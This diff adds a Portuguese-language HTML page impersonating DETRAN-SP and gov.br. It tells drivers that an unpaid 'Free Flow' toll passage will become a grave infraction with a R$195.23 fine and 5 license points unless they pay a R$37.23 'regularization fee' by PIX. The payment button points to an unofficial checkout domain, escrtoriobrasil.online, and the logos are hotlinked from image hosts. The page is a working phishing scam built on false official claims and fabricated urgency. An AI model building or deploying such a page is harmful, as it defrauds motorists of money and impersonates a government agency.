@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SISTEMA DE INFRAÇÕES - DETRAN.SP</title>
+    <style>
+        :root {
+            --detran-blue: #004182;
+            --alert-red: #d32f2f;
+            --dark-gray: #333;
+            --light-bg: #f5f5f5;
+        }
+
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background-color: var(--light-bg);
+            margin: 0;
+            color: var(--dark-gray);
+        }
+
+        /* Header Oficial */
+        header {
+            background: #fff;
+            padding: 10px 5%;
+            border-bottom: 3px solid var(--detran-blue);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo-detran { height: 40px; }
+
+        .gov-tag {
+            background: var(--detran-blue);
+            color: white;
+            padding: 6px 15px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        /* Alerta Crítico */
+        .status-bar {
+            background: #000;
+            color: #fff;
+            text-align: center;
+            padding: 8px;
+            font-size: 11px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        .main-container {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 0 15px;
+        }
+
+        .alert-card {
+            background: #fff;
+            border: 1px solid #ddd;
+            border-top: 6px solid var(--alert-red);
+            border-radius: 4px;
+            padding: 30px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+
+        .header-warning {
+            color: var(--alert-red);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .header-warning h1 {
+            font-size: 20px;
+            margin: 0;
+            font-weight: 800;
+        }
+
+        /* Notificação de Multa */
+        .penalty-notice {
+            background: #fffafa;
+            border: 1px dashed var(--alert-red);
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 4px;
+        }
+
+        .penalty-notice p {
+            margin: 5px 0;
+            font-size: 14px;
+        }
+
+        /* Box de Valor */
+        .fee-section {
+            background: #f8f9fa;
+            border: 1px solid #eee;
+            padding: 25px;
+            text-align: center;
+            margin: 25px 0;
+            border-radius: 8px;
+        }
+
+        .fee-label {
+            font-size: 13px;
+            color: #666;
+            text-transform: uppercase;
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        .fee-amount {
+            font-size: 48px;
+            font-weight: 900;
+            color: var(--detran-blue);
+            display: block;
+        }
+
+        /* Botão de Ação com Link de Checkout */
+        .btn-action {
+            background: var(--detran-blue);
+            color: white;
+            display: block;
+            text-align: center;
+            padding: 22px;
+            text-decoration: none;
+            font-weight: 900;
+            font-size: 18px;
+            border-radius: 5px;
+            text-transform: uppercase;
+            box-shadow: 0 4px 0 #002d5a;
+            transition: background 0.2s;
+        }
+
+        .btn-action:hover {
+            background: #003366;
+        }
+
+        /* Sidebar Assistant Estilo Documento */
+        .assistant-block {
+            display: flex;
+            align-items: center;
+            background: #f0f4f8;
+            padding: 15px;
+            margin-top: 30px;
+            border-radius: 4px;
+            border-left: 4px solid var(--detran-blue);
+        }
+
+        .assistant-block img {
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            margin-right: 15px;
+            background: white;
+            padding: 2px;
+        }
+
+        .footer-legal {
+            text-align: center;
+            font-size: 10px;
+            color: #999;
+            margin-top: 40px;
+            padding-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .highlight-red {
+            color: var(--alert-red);
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+<div class="status-bar">
+    Ambiente Seguro de Regularização - Sincronização Prodesp/Senatran
+</div>
+
+<header>
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQU2SWu94iQAuWSXXUZUrbHIDI8egqGdR7sww&s" class="logo-detran" alt="Detran.SP">
+    <div class="gov-tag">gov.br</div>
+</header>
+
+<div class="main-container">
+    <div class="alert-card">
+        <div class="header-warning">
+            <span>⚠️</span>
+            <h1>NOTIFICAÇÃO DE PENDÊNCIA RESTRITIVA</h1>
+        </div>
+
+        <p>Prezado Condutor,</p>
+        <p>O sistema de monitoramento <strong>Free Flow</strong> detectou uma falha na compensação automática de sua última passagem. Para evitar a conversão desta pendência em <strong>Infração Grave (Art. 209-A do CTB)</strong>, é obrigatório o recolhimento da taxa de validação manual.</p>
+
+        <div class="penalty-notice">
+            <p><strong>AÇÕES EM CURSO:</strong></p>
+            <p>• Aguardando emissão de protocolo extemporâneo.</p>
+            <p>• <span class="highlight-red">Risco de multa: R$ 195,23</span></p>
+            <p>• <span class="highlight-red">Pontuação prevista: 5 pontos na CNH</span></p>
+        </div>
+
+        <div class="fee-section">
+            <span class="fee-label">Taxa de Regularização e Baixa de Sistema</span>
+            <span class="fee-amount">R$ 37,23</span>
+            <span style="font-size: 11px; color: #888;">Pagamento via PIX para baixa automática em até 5 minutos.</span>
+        </div>
+
+        <a href="https://checkout.escrtoriobrasil.online/VCCL1O8SCQCV" class="btn-action">EFETUAR PAGAMENTO DE REGULARIZAÇÃO</a>
+
+        <div class="assistant-block">
+            <img src="https://i.postimg.cc/mD8XGz7C/image-dc50d6.jpg" alt="Suporte Oficial">
+            <div>
+                <p style="margin: 0; font-size: 13px; font-weight: bold;">Validação Digital Integrada</p>
+                <p style="margin: 0; font-size: 12px; color: #666;">O comprovante de quitação será enviado para o e-mail cadastrado no sistema gov.br após a confirmação.</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer-legal">
+        <p>DETRAN.SP - Departamento Estadual de Trânsito de São Paulo</p>
+        <p>Rua Boa Vista, 209 - Centro - São Paulo - SP - CEP 01014-001</p>
+        <p>Documento gerado eletronicamente. O não pagamento implica na lavratura automática do Auto de Infração.</p>
+    </div>
+</div>
+
+</body>
+</html>
